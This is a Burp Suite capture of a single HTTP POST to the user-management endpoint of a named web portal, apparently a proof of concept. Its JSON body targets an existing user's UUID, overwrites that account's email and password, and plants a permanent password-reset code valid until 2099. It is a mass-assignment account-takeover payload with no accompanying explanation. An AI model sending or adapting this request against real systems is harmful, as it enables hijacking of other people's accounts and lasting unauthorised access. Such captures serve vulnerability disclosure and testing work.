# Burp Suite Request
POST /user-management/user HTTP/1.1
Host: portal.skillab-project.eu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portal.skillab-project.eu/register
Content-Type: application/json
Content-Length: 222
Origin: https://portal.skillab-project.eu
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive


{
"id":"[VALID USER UUID]",
"name":"",
"email":"newFlorin","password":"new","address":"","portfolio":"",
"passResetCode":"permanent_code",
"passResetIssuedDate":"2099-05-27T20:55:18.948+00:00"
}